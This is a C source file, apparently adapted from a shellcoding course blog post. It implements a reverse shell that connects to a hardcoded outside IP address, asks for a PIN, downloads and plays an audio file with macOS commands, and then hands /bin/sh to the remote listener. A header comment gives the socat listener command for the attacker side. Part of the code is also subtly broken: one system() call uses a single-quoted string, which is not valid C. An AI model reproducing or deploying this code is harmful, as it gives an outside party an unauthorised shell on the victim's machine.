/* Original code taken from https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/
 * Modifications to connect to specific machine
 socat TCP4-LISTEN:15213 STDOUT
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <curl/curl.h> 
#include <stdlib.h>

int main()
{
	int sockfd;
	char buf[4];
	int result;

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(15213);
	inet_aton("54.82.172.247", &server.sin_addr.s_addr);
	bzero(&server.sin_zero, 8);

	char *const argv[] = {"/usr/bin/sh", NULL};
	char *const envp[] = { NULL };

	//create a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	//initiate a connection on a socket, on success 0 is returned
	printf("%d", connect(sockfd, (struct sockaddr *)&server, sizeof(server)));
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);


	int pid = fork();
	if (pid == 0) {
	  write(sockfd, "PIN:", 4);
	  read(sockfd, &buf, 4);

	  result = strncmp("1234", buf, 4);
	  if (result != 0) {
	    return 0;
	  }

      system("curl --output sound.wav https://www.wavsource.com/snds_2020-10-01_3728627494378403/sfx/ahem_x.wav");

      system('osascript -e "set Volume 10"');

      system("afplay sound.wav");

	  execve("/bin/sh", argv, envp);
	}
	
	return 0;
}